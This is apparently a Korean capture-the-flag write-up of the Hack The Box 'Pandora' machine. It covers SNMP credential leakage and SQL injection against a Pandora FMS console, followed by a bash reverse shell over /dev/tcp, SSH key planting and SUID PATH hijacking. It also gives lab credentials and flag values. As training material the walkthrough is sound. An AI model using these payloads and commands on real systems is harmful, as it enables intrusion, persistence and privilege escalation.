---
slug: "pandora"
title: "pandora"
date: 2026-07-06
category: "HTB"
tags: []
excerpt: "80포트에 너무 아무 정보가 없어서 udp 스캔을 해봄 ```shell nmap -sU --top-ports 3 10.129.22.152 ``` -> 161/udp open…"
readingTime: 10
---


---
#### Box: pandora | Linux | Easy
날짜:
소요시간:

##### Open Ports
22
80
##### Interesting Services

```shell
gobuster dir -u http://10.129.22.152 -w /usr/share/seclists/Discovery/Web-Content/common.txt

# /assets 발견 Apache/2.4.41 (Ubuntu) Server at 10.129.22.152 Port 80
```


80포트에 너무 아무 정보가 없어서 udp 스캔을 해봄
```shell
nmap -sU --top-ports 3 10.129.22.152
```
-> 161/udp  open   snmp
**snmp :** 네트워크 장치 간에 관리 데이터를 전송하는 애플리케이션 계층 프로토콜

##### Initial Foothold
벡터:
명령어:
snmpwalk로 snmp 값을 조회할 수 있음
```shell
snmpwalk -v 2c -c public 10.129.22.152 1.3.6.1.2.1 | grep -iE "pass|user|login|cred|key|secret|token|admin|root|cmd|exec|run|install|home|tmp|-u|-p"

# iso.3.6.1.2.1.25.4.2.1.5.976 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"
```

해당 크레덴셜로 ssh 접속
~~~sh
ssh daniel@10.129.22.152
~~~


##### Privilege Escalation (daneil -> matt)
벡터:
명령어:
여기부터 중요: apache2를 사용한다고 해서 /etc/apache2 를 들어가봤더니 
```shell
cd /etc/apache2/sites-available

cat pandora.conf 
<VirtualHost localhost:80>
  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
  <Directory /var/www/pandora>
    AllowOverride All
  </Directory>
  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
</VirtualHost>
```
-> 다음과 같은 정보가 있음 

ssh 터널링을 통해 daniel과 내껄 연결해서 확인
```shell
ssh -L 5000:localhost:80 daniel@10.129.22.152
```

들어가보니 footer에 다음과 같은 정보가 있음 `v7.0NG.742_FIX_PERL2020`
여기에 취약점이 많다고 함 [CVE-2021-32099](https://www.sonarsource.com/blog/pandora-fms-742-critical-code-vulnerabilities-explained/)
심지어 인증 전에 하는 sqli 도 있다고 하는 것 같음.
```shell
netstat -tnlp

#3306 이 열려있음 -> mysql 을 사용하는 듯함
```

아래로 들어가서 sqli를 시도해봄
```
http://localhost:5000/pandora_console/include/chart_generator.php?session_id=' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a -- 
```
간단하게 이렇게 error based를 넣어봤는데 오류가 직접 눈에 보임 !!

**visible errorbased sqli**
-> 가끔 안되는 경우가 있는데 그럴땐 url 인코딩 ㄱㄱ
```
# db 이름 출력
' and extractvalue('1', concat(0x3a, (select database()))) and 1=1 -- 
-> pandora

# 에러에 tsessions라는거 나오니 테이블 이름은 생략
' and extractvalue('1', concat(0x3a, (select table_name from information_schema.tables where table_schema='pandora' limit 0,1))) and 1=1 -- 
-> 결과가 여러개 이면 에러 발생하므로 limit 사용하여 하나씩 출력.

# column 출력
' and extractvalue('1', concat(0x3a, (select column_name from information_schema.columns where table_name = 'tsessions_php' limit 0,1))) and 1=1 -- 
-> id_session, last_active, data   3개라는걸 알 수 있었음

# 항목 출력
' and extractvalue('1', concat(0x3a, (select data from tsessions_php limit 0,1))) and 1=1 -- 
-> 항목이 40개이기도 하고 읽어봐도 의미 없음
```

해당 취약점이 data column을 읽고 이를 세션 디코딩해서 로그인을 시키는데 이때 이 값이 admin인 경우 로그인을 허용함. 그럼 union을 이용해 admin이라고 출력하도록 함 (admin은 그냥 추측임)
```
a' UNION SELECT 'a', 1, 'id_usuario|s:5:"admin";' as data -- -
```

여기에 rce 취약점도 있다고 함
[CVE-2021-32099](https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/blob/master/sqlpwn.py)
여기 있는 코드로 하면 잘 안되므로 아래 껄로 리버스 쉘 실행 후 플래그 획득
```
http://localhost:5000/pandora_console/images/exploit.php?test=/bin/bash+-c+'/bin/bash+-i+>%26+/dev/tcp/10.10.15.242/5555+0>%261'
```
**user.txt: c382eabc83bd2d9412ec7bffa1942300**

##### Privilege Escalation (matt -> root)
벡터:
명령어:
suid 가진 녀석들 탐색
~~~shell
find / -user root -perm -4000 -ls 2>/dev/null

#-> 누가봐도 수상해 보이는 애가 있음 /usr/bin/pandora_backup

ltrace pandora_backup
# -> tar를 상대경로로 쓰고 있음 바로 pathhijacking
~~~
**ltrace :**  SUID 바이너리 분석할때  특히 유용함.

하기 전에 !!!  아래와 같은 오류가 있음

~~~
matt@pandora:/var/www/pandora/pandora_console/images$ sudo -l
sudo -l
sudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permitted
sudo: unable to initialize policy plugin
~~~
이유는 다음과 같음
- 웹쉘 (nc 리버스쉘) → Apache 자식 프로세스 → `mpm-itk seccomp `필터 적용 → SUID 실행해도 matt 그대로  
		-> 저 mpm-itk 모듈이 문제인거임

- SSH (직접 접속) → Apache 프로세스 완전히 벗어남 → seccomp 제한 없음 → SUID 정상 작동 → root

그래서 내 kali의 공개키를 여기에 등록시켜서 ssh 접속을 할 수 있게 할거임

**내 공개키 등록으로 ssh 접속하기**
```shell 
#kali에서
ssh-keygen
#공개키 복사
cat ~/.ssh/id_ed25519

#user에서 
mkdir ~/.ssh
#kali 공개키 등록
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINAH5kiNKcrPTrxfli64vof8xA2CNUU7tFJs840U6X2j kali@kali" > ~/.ssh/authorized_keys

#kali에서
ssh -i ~/.ssh/id_ed25519 matt@10.129.22.152
```

PATH Traversal
~~~shell
printf '#!/bin/bash\n/bin/bash -p\n' > /tmp/tar

cat /tmp/tar
> #!/bin/bash
> /bin/bash -p

chmod +x /tmp/tar

export PATH=/tmp:$PATH

echo $PATH
> /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

#이러고 실행시키면 
pandora_backup

cat /root/root.txt
~~~
 -> **root.txt :** beeead5a160084c9253df2fc47817f8e

##### Rabbit Hole (막혔던 것)

**1. gobuster로 80포트만 스캔**  
처음에 80포트만 봐서 정보가 너무 없었음. UDP 스캔을 안 해서 SNMP를 못 찾을 뻔함. 포트 스캔은 TCP/UDP 둘 다 하는 습관 필요.

**2. error based Blind Sqli**

**3. Union based Blind Sqli**

**4. 웹쉘에서 SUID 실행 안 됨**  
nc 리버스쉘에서 `pandora_backup` 실행해도 matt 그대로. mpm-itk seccomp 필터 때문. SSH로 전환해야 해결됨.

**5. Path travelsal**

**6. 공개키 삽입으로 리버스 쉘 ssh에서 그냥 ssh로 접속**
##### 다음 박스에서 써먹을 것
- 포트 스캔은 TCP + UDP 둘 다
- SNMP 열려있으면 `snmpwalk`로 크레덴셜 탐색
- Apache 설정 `/etc/apache2/sites-available` 확인 습관
- 버전 정보 발견 시 CVE 바로 검색
- SUID 바이너리 발견 시 `ltrace`로 상대경로 명령어 확인
- 웹쉘에서 SUID 안 되면 SSH 전환 고려
- PATH hijacking 시 `/bin/bash -p` 플래그 필수 (SUID 환경에서 권한 유지)
- SQL payload 복사붙여넣기 시 URL 인코딩 확인